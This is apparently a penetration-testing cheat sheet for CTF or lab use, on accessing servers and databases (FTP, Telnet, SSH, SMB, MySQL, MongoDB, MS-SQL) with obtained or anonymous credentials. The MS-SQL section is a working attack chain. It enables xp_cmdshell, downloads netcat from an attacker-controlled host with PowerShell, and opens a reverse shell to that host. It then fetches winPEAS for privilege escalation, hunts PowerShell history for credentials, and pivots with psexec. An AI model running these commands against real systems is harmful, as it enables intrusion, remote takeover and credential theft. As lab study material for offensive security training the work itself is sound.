---
description: Got DB/server creds, What's next?
---

# 👨‍💻Access Tricks

## :cloud: <mark style="color:blue;">Server</mark>

### <mark style="color:green;">FTP</mark>

1- Conn to the server:

```
ftp <IP/Domain>
```

2-set local FTP file download dir:

```
lcd /your/pc/dir
```

3-Download the file:

```
get <file>
```

> You can also download multiple files with wildcard + mget.
>
> `mget *.txt`

{% embed url="https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell" %}
Great to work with FTP servers
{% endembed %}

#### Anonymous FTP:

When faced with an anon-ftp server just:

* username: "Anonymous"
* Password: anything really (sometimes empty).

### <mark style="color:green;">Telnet</mark>

1-Conn to the telnet server:

```
telnet <ip> -l <username>
```

> then it will ask for the password.
>
> then you have $ check if you are \<username>
>
> `$whoami`

### <mark style="color:green;">SSH</mark>

1-Conn the SSH server:

```
ssh <username>@<IP>
```

> then same as the telnet server.

### <mark style="color:green;">SMB</mark>

1- Conn to a share:

```
sudo smbclient //<IP>/<share> -N
```

2- Find your flag `pwd` the dir and download the file:

```
smb: get <file> //while inside smb session
//or you can read it
smb: get <file> -
```

```
smbget -R smb://<IP>/<share>/<file>
```

> ⚠ Will ask for a pass but by enum you should know if null sesssoin attack is possible so just click enter (no pass).



* Checking the share permissions:

```
smbmap -H <IP>
```









## 🛢<mark style="color:blue;">Database</mark>

### <mark style="color:green;">MySQL</mark>

1-Conn to MySQL server:

```
mysql -h <server_hostname> -u username -p <database_name>
```

* `-p` tells mysql to prompt for a password.

{% embed url="https://docs.cs.cf.ac.uk/notes/accessing-mysql-from-linux" %}
Great MySQL tut.
{% endembed %}

2-List all DB:

```
SHOW DATABASES;
```

3-Select a DB:

```
USE <DatabaseName>;
```

4-Show tables

```
SHOW tables;
```

5-Select a Table:

```
SELECT * FROM <TableName>;
```

#### 💪By Here probably you got what you want...

You can show info about (structure: feild/type/PK..etc)

```
DESCRIBE <TableName>;
```

### <mark style="color:green;">MongoDB</mark>

> Install mongo client (debian):

```
apt install mongodb-clients
```

> Connect to MongoDB:

```
mongo --port <port> -u <username> -p <password> <IP>
```

{% embed url="https://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html" %}
Greate to work with MongoDB
{% endembed %}

### <mark style="color:green;">SQL Server (MS-SQL)</mark>

Great Articles:

{% embed url="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server" %}

{% embed url="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" %}

1-**Connect**: if you got the username/password you can conn using Impackt (col. of python tools):

```
impacket-mssqlclient <USER>:<PASS>@<IP> -p [PORT] -windows-auth
```

2-Check what role you have in the server:[](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-serverhttps://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

```
SELECT is_srvrolemember('sysadmin')
```

> output is `1` then it's true.

3-Activate shell: xp-cmdshell

```
EXEC sp_configure 'xp_cmdshell', 1;
//or
enable_xp_cmdshell
```

4-Now you can excute commands:

```
xp_cmdshell "whoami"
```

Achieve a Reverse shell: now you can use python SimpleHTTPServer & nc to transfer a payload.

also use powershell to get much more power:

```
xp_cmdshell "powershell -c pwd"
```

Download a payload:

```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<Attacker_IP>/nc64.exe -outfile nc64.exe"
```

> I'm downloading nc64.exe&#x20;

Reverse shell:

```
nc -lvnp 443  //on my machine
sudo python3 -m http.server 80 //On attacker machine

//on target server:
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <Attacker_IP> <PORT>"
```

Now you will notice in your nc that the target got connected to you...🎉

we can use [PEASS-ng](https://github.com/carlospolop/PEASS-ng) for win privilage escalation.

in same way download it via python httpserver then excute it:

```
powershell //inside nc rev now we have wget cuz of PS
wget http://<my_IP>/winPEASx64.exe -outfile winPEASx64.exe

.\winPEASx64.exe //excute it for prev escalation info
```

you might be able to find: `ConsoleHost_history.txt` .bash\_history equivlant in MS it exsits in: `\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\`\
read it you might find cred info spo you can use:

```
impacket-psexec <Found_user>@<Target_IP>
```
